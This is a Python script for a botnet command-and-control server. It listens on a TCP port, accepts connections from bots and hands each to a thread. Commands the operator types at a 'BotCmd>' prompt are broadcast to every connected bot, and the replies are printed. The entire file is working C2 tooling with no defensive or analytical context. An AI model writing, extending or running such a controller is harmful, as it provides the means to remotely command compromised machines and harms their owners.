#!/usr/bin/env

import socket  # Socket Library
import threading  # Manage concurrent threads
import sys  # System Library. Parse arguments
import time  # Delaying
import queue  # Exchange information between mutiple threads
import os  # Operating system functionality

que = queue.Queue()  # Construct a FIFO queue object
# With multiple bots and threads, Queue allows the bots to converse with eachother and the main server.
Socketthread = []  # List to hold all child threads, and a count of bots to determine amount of commands to queue for each bot.
ClientList = {}


# noinspection PyShadowingNames
def listener(lhost, lport, que):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_address = (lhost, lport)
    server.bind(server_address)  # Binds the socket to the address. Allowing the receiving of data.
    server.listen(10)  # Limit the port to 50 connections to handle at max.

    print("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
    bot_cmd_thread = BotCmd(que)
    bot_cmd_thread.start()
    while True:
        (client, client_addr) = server.accept()
        newthread = BotControl(client, client_addr, que)
        Socketthread.append(newthread)
        newthread.start()


class BotCmd(threading.Thread):
    def __init__(self, qv2):
        threading.Thread.__init__(self)  # Intialize thread to this object so it can be identified.
        self.que = qv2

    def run(self):
        while True:
            send_cmd = str(input("BotCmd> "))
            if (send_cmd == ""):
                pass
            elif (send_cmd == "exit"):
                for i in range(len(Socketthread)):
                    time.sleep(0.1)
                    self.que.put(send_cmd)
                time.sleep(5)
                os._exit(0)  # Exit process without cleanup.
            else:
                print("[+] Sending Command: " + send_cmd + " to " + str(len(Socketthread)))
                for i in range(len(Socketthread)):
                    time.sleep(0.1)
                    self.que.put(send_cmd)


class BotControl(threading.Thread):
    def __init__(self, client, client_addr, qv):
        threading.Thread.__init__(self)
        self.client = client
        self.client_addr = client_addr
        self.ip = client_addr[0]
        self.port = client_addr[1]
        self.que = qv

    def run(self):
        slave_id = threading.current_thread().getName()
        print("[*] Bot " + self.ip + ":" + str(self.port) + " connected with ID: ", slave_id)
        ClientList[slave_id] = self.client_addr
        while True:
            recv_bot_cmd = self.que.get()
            print("\nReceived Command: " + recv_bot_cmd + " for " + slave_id)
            try:
                #recv_bot_cmd += "\n"
                self.client.send(recv_bot_cmd.encode('utf-8'))
                recv_val = (self.client.recv(1024)).decode('utf-8')
                print(recv_val)
            except Exception as excpt:
                for t in Socketthread:
                    if t.is_alive() == False:
                         print("\n[!] Died Thread: " + str(t))
                         t.join()
                print(excpt)
                break


def main():
    if (len(sys.argv) < 3):  # Insufficient commandline arguments.
        print("[!] Usage:\n  [+] python3 " + sys.argv[0] + " <LHOST> <LPORT>\n  [+] Eg.: python3 " + sys.argv[
            0] + " 0.0.0.0 8080\n")
    else:
        try:
            lhost = sys.argv[1]  # Store value for the listener host.
            lport = int(sys.argv[2])  # Store value for the listener port.
            listener(lhost, lport, que)
        except Exception as x:  # Error report
            print("\n[-] Unable to run the handler. Report: " + str(x) + "\n")


if __name__ == '__main__':
    main()
